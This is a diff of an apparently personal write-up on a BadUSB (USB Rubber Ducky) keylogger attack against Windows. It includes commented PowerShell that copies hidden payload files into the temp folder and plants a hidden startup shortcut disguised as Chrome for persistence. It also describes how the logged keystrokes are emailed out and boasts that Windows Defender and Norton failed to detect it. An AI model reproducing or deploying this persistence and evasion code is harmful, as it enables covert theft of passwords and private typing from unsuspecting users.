@@ -168,38 +168,46 @@ Stage 1
 4. It then delays 200ms to wait for the powershell window to open before it starts typing
 
 Stage 2
+
 This is where you see the speed typing prowes of the usb rubber ducky as it types out an entire powershell program in a second. The program moves the files p.ps1, l.ps1 and c.cmd to where they need to go and it does this by typing that big string into the powershell terminal which is basically just a powershell program squished into one string. Here is where i modified the attack. Origionally the the script would copy c.cmd into the start folder and l.ps1 and p.ps1 into the temp folder but that lead to the c.cmd being visible in the startup section of task manager. Instead i made all three files hidden and moved them into the temp folder. I then use powershell to  create a hidden shortcut to c.cmd, named it chrome and gave it the chrome icon. I placed this shortcut in the startup folder so now if you have viewing hidden files on it looks just like google chrome is in the startup folder. This is not uncommon and i dont think a user would think twice about this. The fact that the shortcut is hidden also means that nothing showes up in task manager's startup items. Another bonus is now that i am using a shortcut to launch the cmd i can specify that the window should be started in minimized mode. So when the script runs at startup a cmd window wont pop up momentarially, instead youll just see a flash of the cmd icon on the task bar which is almost unnoticable. These steps just further allow our attack to avoid detection. Below you can see the powershell string in readable code format with comments so it's easier to understand.
 
 ```
-REM this line just selects the usb device's name which is "L"
+# this line just selects the usb device's name which is "L"
 $u=gwmi Win32_Volume|?{$_.Label -eq'L'}|select name;
 
-REM this changes us into the usb's directory
+# this changes us into the usb's directory
 cd $u.name;
 
-REM this coppies p.ps1, l.ps1, c.cmd and the chrome icon file into the windows temp folder (could have been any folder but this is just easy)
+# this coppies p.ps1, l.ps1, c.cmd and the chrome icon file into the windows temp folder (could have been any folder but this is just easy)
 cp .\p.ps1 $env:temp;
 cp .\l.ps1 $env:temp;
 cp .\c.cmd $env:temp;
 cp .\ChromeIcon.ico $env:temp;
 
-REM this creates a new shortcut called "Chrome"
+# this creates a new shortcut called "Chrome"
 $WScriptObj = New-Object -ComObject ("WScript.Shell");
 $shortcut = $WscriptObj.CreateShortcut("C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/StartMenu/Programs/Startup/Chrome.lnk");
 
-REM this sets the newly created shortcut to point to c.cmd
+# this sets the newly created shortcut to point to c.cmd
 $shortcut.TargetPath = "$env:temp\c.cmd";
 
-REM this sets the icon of the shortcut to the chrome logo to help it hide in plain sight
+# this sets the icon of the shortcut to the chrome logo to help it hide in plain sight
 $Shortcut.IconLocation = "$env:temp\ChromeIcon.ico, 0";
 
-REM this saves the shortcut
+# this saves the shortcut
 $shortcut.Save();
 
-REM this changes into the temp folder and creates the log file that will log the users keystrokes
+# this changes into the temp folder and creates the log file that will log the users keystrokes
 cd $env:temp;
 echo "">"$env:UserName.log";
 ```
 
 Stage 3
-This stage just changed into the startup folder and runs the shortcut to c.cmd starting the keylogger. It then exits and cleans up and at this point you can remove the usb and the attack is finished.
+
+This stage just changed into the startup folder and runs the shortcut to c.cmd starting the keylogger. It then exits and cleans up and at this point you can remove the usb and the attack is finished. You should see an email in the inbox of the email you put into p.ps1 indicating that it is running properly.
+
+### Final Comments
+I was absolutly astonished by how well this attack works not only did windows defender not detect it, i ran the same attack on my main computer and Norton 360 didnt detect it either! Norton is suposed to be the best but it didnt detect a thing even after a system scan. The only thing that i would maybe improve about the keylogger with time would be that when it logs the keystrokes it doesnt log things such as the delete key being pressed so if someone makes a mistake while typing you cant see where they corrected it.
+
+## Additional Resources
+- [Here](https://www.bleepingcomputer.com/news/security/heres-a-list-of-29-different-types-of-usb-attacks/) is a list of 29 different attacks that can be performed by BadUSB's but there are many more
